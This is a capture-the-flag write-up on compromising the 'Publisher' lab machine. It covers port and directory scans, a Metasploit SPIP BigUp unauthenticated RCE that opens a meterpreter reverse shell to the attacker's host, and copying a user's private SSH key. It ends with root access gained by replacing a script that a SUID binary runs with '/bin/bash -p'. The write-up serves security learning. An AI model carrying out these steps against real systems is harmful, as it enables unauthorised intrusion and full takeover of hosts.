# Publisher

**Category:** Pentest, privilege escalation

**Difficulty:** Easy

**Description:**  "The "**Publisher**" CTF machine is a simulated environment hosting some services. Through a series of enumeration  techniques, including directory fuzzing and version identification, a  vulnerability is discovered,  allowing for Remote Code Execution (RCE). Attempts to escalate privileges  using a custom binary are hindered by restricted  access to critical system files and directories, necessitating a deeper  exploration into the system's security profile to ultimately  exploit a loophole that enables the execution of an unconfined bash  shell and achieve privilege escalation."

---

First of all let's scan with `Nmap` the IP we have.

```bash
simsdu@laptop:~$ nmap -p- 10.64.129.112
Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-05 22:27 CET
Nmap scan report for 10.64.129.112
Host is up (0.12s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 471.49 seconds
```

We have 2 open ports: 22 and 80, let's dig.

```bash
simsdu@laptop:~$ nmap -sC -sV -p22,80 10.64.129.112
Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-05 22:37 CET
Nmap scan report for 10.64.129.112
Host is up (0.12s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 e0:a5:fb:fa:9b:14:cd:73:ae:fa:6a:43:5e:c1:2e:52 (RSA)
|   256 0f:b1:76:af:32:64:0c:73:c1:7e:3b:6f:42:3f:a5:64 (ECDSA)
|_  256 36:7c:03:7d:d3:ff:24:6e:ff:26:06:73:97:74:be:69 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Publisher's Pulse: SPIP Insights & Tips
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.17 seconds
```

We can see a service running on port 80 : **SPIP**. Let's search on metasploit if we have a vulnerability. 

(We can also get **SPIP** with gobuster.)

```bash
simsdu@laptop:~$ gobuster dir -u 10.64.129.112 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.64.129.112
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/images               (Status: 301) [Size: 315] [--> http://10.64.129.112/images/]
/spip                 (Status: 301) [Size: 313] [--> http://10.64.129.112/spip/]
```

---

```bash
msf > search spip

Matching Modules
================

   #   Name                                             Disclosure Date  Rank       Check  Description
   -   ----                                             ---------------  ----       -----  -----------
   0   exploit/multi/http/spip_bigup_unauth_rce         2024-09-06       excellent  Yes    SPIP BigUp Plugin Unauthenticated RCE
```

We actually have an exploit for spip, after giving the LHOST and the RHOSTS, we can run this exploit.

```bash
msf > use 0
[*] No payload configured, defaulting to php/meterpreter/reverse_tcp

msf exploit(multi/http/spip_bigup_unauth_rce) > run
[*] Started reverse TCP handler on 192.168.153.94:4444 
[*] Running automatic check ("set AutoCheck false" to disable)
[*] SPIP Version detected: 4.2.0
[+] SPIP version 4.2.0 is vulnerable.
[*] Bigup plugin version detected: 3.2.1
[+] The target appears to be vulnerable. Both the detected SPIP version (4.2.0) and bigup version (3.2.1) are vulnerable.
[*] Found formulaire_action: login
[*] Found formulaire_action_args: CKNCtIcqq36vgfpnqRbYs...
[*] Preparing to send exploit payload to the target...
[*] Sending stage (41224 bytes) to 10.64.129.112
[*] Meterpreter session 1 opened (192.168.153.94:4444 -> 10.64.129.112:46590) at 2025-12-05 22:59:52 +0100

meterpreter >
```

It works ! Let's navigate now

```bash
meterpreter > ls
Listing: /home/think
====================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
020666/rw-rw-rw-  0     cha   2025-12-05 22:25:41 +0100  .bash_history
100644/rw-r--r--  220   fil   2023-11-14 09:57:26 +0100  .bash_logout
100644/rw-r--r--  3771  fil   2023-11-14 09:57:26 +0100  .bashrc
040700/rwx------  4096  dir   2023-11-14 09:57:24 +0100  .cache
040700/rwx------  4096  dir   2023-12-08 14:07:22 +0100  .config
040700/rwx------  4096  dir   2024-02-10 22:22:33 +0100  .gnupg
040775/rwxrwxr-x  4096  dir   2024-01-10 13:46:09 +0100  .local
100644/rw-r--r--  807   fil   2023-11-14 09:57:24 +0100  .profile
020666/rw-rw-rw-  0     cha   2025-12-05 22:25:41 +0100  .python_history
040755/rwxr-xr-x  4096  dir   2024-01-10 13:54:17 +0100  .ssh
020666/rw-rw-rw-  0     cha   2025-12-05 22:25:41 +0100  .viminfo
040750/rwxr-x---  4096  dir   2023-12-20 20:05:25 +0100  spip
100644/rw-r--r--  35    fil   2024-02-10 22:20:39 +0100  user.txt

meterpreter > cat user.txt
first_flag_here
```

Nice, we find the first flag. The second one is in the /root directory, we have to find away to escalate privilege. 

In the .ssh directory i find an sshkey **id_rsa** for the **think** user, let's copy it on our computer and connect via SSH.

```bash
meterpreter > cd .ssh
meterpreter > ls
Listing: /home/think/.ssh
=========================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
100644/rw-r--r--  569   fil   2024-01-10 13:54:17 +0100  authorized_keys
100644/rw-r--r--  2602  fil   2024-01-10 13:48:14 +0100  id_rsa
100644/rw-r--r--  569   fil   2024-01-10 13:48:14 +0100  id_rsa.pub
```

```bash
simsdu@laptop:~/Documents/publisher$ ssh -i sshkey think@10.64.129.112
think@ip-10-64-129-112:~$ ls -l
total 8
drwxr-x--- 5 www-data www-data 4096 Dec 20  2023 spip
-rw-r--r-- 1 root     root       35 Feb 10  2024 user.txt
```

With Linpeas, we have a SUID: /usr/sbin/run_container

It executes a script from the **/opt/run_container.sh**. 

We can go in **/var/tmp/**, we have permission to create files here. Let's create a script to execute /bin/bash -p, give this script +x permission and send it to /opt/. Then when we execute run_container, it will execute the new run_container.sh and give us root perm!

The script i replace run_container.sh is the one below.

```bash
#!/bin/bash

/bin/bash -p
```

```bash
think@ip-10-64-129-112:~$ cd /var/tmp/
think@ip-10-64-129-112:/var/tmp$ touch script
think@ip-10-64-129-112:/var/tmp$ nano script
think@ip-10-64-129-112:/var/tmp$ chmod +x script 
think@ip-10-64-129-112:/var/tmp$ cp script /opt/run_container.sh 
think@ip-10-64-129-112:/var/tmp$ /usr/sbin/run_container 
bash-5.0# cd /root
bash-5.0# id
uid=1000(think) gid=1000(think) euid=0(root) egid=0(root) groups=0(root),1000(think)
bash-5.0# ls
root.txt  spip
bash-5.0# cat root.txt
second_flag_here
```

We are now root and just have to print the second flag !
